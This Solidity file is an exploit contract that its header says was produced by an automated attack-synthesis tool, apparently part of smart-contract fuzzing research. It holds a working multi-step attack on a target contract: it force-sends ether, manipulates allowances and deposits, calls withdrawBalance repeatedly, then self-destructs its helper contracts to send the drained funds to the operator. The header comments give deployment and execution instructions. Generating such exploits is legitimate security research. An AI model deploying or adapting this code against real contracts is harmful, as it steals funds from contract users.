/*
 * Multi-Attacker Exploit Generated by EF/CF Attack Contract Synthesizer
 *
 * Deploy the `Attack` contract with the target address as the constructor
 * parameter. Make sure to send at least 302259 ether and 454903657293676544 wei to the attack
 * contract along with the constructor.
 *
 * To execute the attack, call the `attack()` method. Calling `attack` might
 * emit the `WaitForBlocks(N)` event. In this case you should call the
 * `attack()` method again after `N` blocks have passed.
 *
 * To start the attack again, you can use `reset(new_target_addr)` to reset the
 * attack contract. If you pass in `address(0)` the old target address will be
 * used.
 *
 * To claim the Ether gained with the attack, issue a call to `finish()`, which
 * will destroy all attack contracts and send all funds back to you.
 *
 * The original test case was executed with the following environment:
 * block number: +0
 * timestamp: +0
 * gas limit: 0
 * difficulty: 0
 * initial balance: 0x40000000000000000000 wei
 *
 */

pragma solidity ^0.7;

/*****************************************************/
contract ForceSender {
    function send(address payable target) external payable {
        selfdestruct(target);
    }
    receive() external payable {}
}

/*****************************************************/

interface AttackManager {
    function __get_state() external view returns(uint);
    function __set_state(uint _state) external;
    function __id_to_address(uint id) external view returns(address payable);
}

contract AttackDispatcher {

    event AttackProgress(uint state, address who, bool success, bytes retdata);

    uint id;
    address target;
    AttackManager manager;

    constructor(uint _id, address _target) payable {
        id = _id;
        manager = AttackManager(msg.sender);
        target = _target;
    }

    fallback() external payable {
        _fallback();
    }
    receive() external payable {
        _fallback();
    }

    function _finish() external {
        address to = address(manager);
        require(msg.sender == to);
        selfdestruct(payable(to));
    }

    function _fallback() internal {
        uint state = manager.__get_state();
        if (state == 0) {
        }
        else if (state == 1) {
        }
        else if (state == 2) {
            _dispatch();
            bytes memory retdata = bytes("");
            uint retdata_len = 0;
            assembly { return(retdata, retdata_len) }
        }
        else if (state == 3) {
        }
        else if (state == 4) {
            bytes memory retdata = bytes("");
            uint retdata_len = 0;
            assembly { return(retdata, retdata_len) }
        }
    }

    function _dispatch() public returns(bool) {
        uint state = manager.__get_state();
        if (state == 0) {
            if (id == 2) {
                /*  func: addAllowance(address,uint256) (0xf3c40c4b)
                input: { address(0xc04689c0c5d48cec7275152b3026b53f6f78d03d), uint(18446744073709551616),  }
 
                 */
                bytes memory data = abi.encodePacked(hex"f3c40c4b000000000000000000000000", (manager.__id_to_address(0)));
                uint value = 0x0;
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
                emit AttackProgress(state, address(this), success, retdata);
                state += 1;
                manager.__set_state(state);
                return true;
            } else {
                AttackDispatcher via = AttackDispatcher(manager.__id_to_address(2));
                via._dispatch();
            }
        }
        else if (state == 1) {
            if (id == 2) {
                /*  func: deposit() (0xd0e30db0)
                input: {  }
 
                 */
                bytes memory data = bytes(hex"d0e30db0");
                uint value = 0x18493fba64ef00000;
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
                emit AttackProgress(state, address(this), success, retdata);
                state += 1;
                manager.__set_state(state);
                return true;
            } else {
                AttackDispatcher via = AttackDispatcher(manager.__id_to_address(2));
                via._dispatch();
            }
        }
        else if (state == 2) {
            if (id == 2) {
                /*  func: withdrawBalance() (0x5fd8c710)
                input: {  }
 
                 */
                bytes memory data = bytes(hex"5fd8c710");
                uint value = 0x0;
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
                emit AttackProgress(state, address(this), success, retdata);
                state += 1;
                manager.__set_state(state);
                return true;
            } else {
                AttackDispatcher via = AttackDispatcher(manager.__id_to_address(2));
                via._dispatch();
            }
        }
        else if (state == 3) {
            if (id == 0) {
                /*  func: transferFrom(address,uint256) (0x1c6adc3)
                input: { address(0xc2018c3f08417e77b94fb541fed2bf1e09093edd), uint(18446744073709551616),  }
 
                 */
                bytes memory data = abi.encodePacked(hex"01c6adc3000000000000000000000000", (manager.__id_to_address(2)));
                uint value = 0x0;
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
                emit AttackProgress(state, address(this), success, retdata);
                state += 1;
                manager.__set_state(state);
                return true;
            } else {
                AttackDispatcher via = AttackDispatcher(manager.__id_to_address(0));
                via._dispatch();
            }
        }
        else if (state == 4) {
            if (id == 0) {
                /*  func: withdrawBalance() (0x5fd8c710)
                input: {  }
 
                 */
                bytes memory data = bytes(hex"5fd8c710");
                uint value = 0x0;
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
                emit AttackProgress(state, address(this), success, retdata);
                state += 1;
                manager.__set_state(state);
                return true;
            } else {
                AttackDispatcher via = AttackDispatcher(manager.__id_to_address(0));
                via._dispatch();
            }
        }
        return false;
    }
}

contract Attack is AttackManager {

    event WaitForBlocks(uint count);
    event StateReached(uint state);
    event AttackFinished();

    uint constant REQUIRED_BUDGET = 0x40018493fba64ef00000; /* equals 302259 ether and 454903657293676544 wei */
    uint constant INITIAL_ETHER = 0x40000000000000000000;

    uint state = 0;
    uint depth = 0;
    uint budget = 0;

    address payable owner;
    address payable target;

    mapping (uint => uint) state2sub;
    mapping (uint => uint) state2blockadvance;

    AttackDispatcher[7] subs;

    constructor(address payable _target) payable {
        require(_target != address(0));
        target = _target;
        owner = payable(msg.sender);
        reset(address(0));
        state2sub[0] = 1 + 2;
        state2sub[1] = 1 + 2;
        state2sub[2] = 1 + 2;
        state2sub[3] = 1 + 0;
        state2sub[4] = 1 + 0;
    }

    modifier onlyOwner {
        require(owner != address(0));
        require(msg.sender == owner);
        _;
    }

    function __get_state() public view override returns(uint) {
        return state;
    }
    function __set_state(uint _state) public override {
        state = _state;
    }
    function __id_to_address(uint id) public view override returns(address payable) {
        if (id < 7) {
            return payable(address(subs[id]));
        }
        return payable(address(0));
    }

    receive() external payable {
        budget += msg.value;
    }

    function _reclaim_subs() internal {
        // delete prior attack subs, extracting funds
        for (uint i = 0; i < 7; i++) {
            if (address(subs[i]) != address(0)) {
                subs[i]._finish();
            }
        }
    }

    function reset(address _new_target) public onlyOwner payable {
        _reclaim_subs();

        if (_new_target != address(0)) {
            target = payable(_new_target);
        }

        // check budget
        budget = address(this).balance;
        require(budget >= REQUIRED_BUDGET);

        // reset state and sub contracts
        state = 0;
        subs[0] = new AttackDispatcher{value: 0 }(0, target);
        subs[2] = new AttackDispatcher{value: 28000000000000000000 }(2, target);
    }

    function finish() external onlyOwner {
        _reclaim_subs();
        selfdestruct(owner);
    }
    
    function finishTo(address payable to) external onlyOwner {
        _reclaim_subs();
        selfdestruct(to);
    }

    function attack() external onlyOwner payable {
        if (state == 0) {
            ForceSender f = new ForceSender();
            f.send{value: INITIAL_ETHER}(target);
        }

        while (state < 5) {
            uint sub_id = state2sub[state];
            if (sub_id == 0) { // no sub available for the given state id
                break;
            }
            emit StateReached(state);
            sub_id -= 1;
            subs[sub_id]._dispatch();

            uint ba = state2blockadvance[state];
            if (ba > 0) {
                emit WaitForBlocks(ba);
                break;
            }
        }

        emit AttackFinished();
    }
}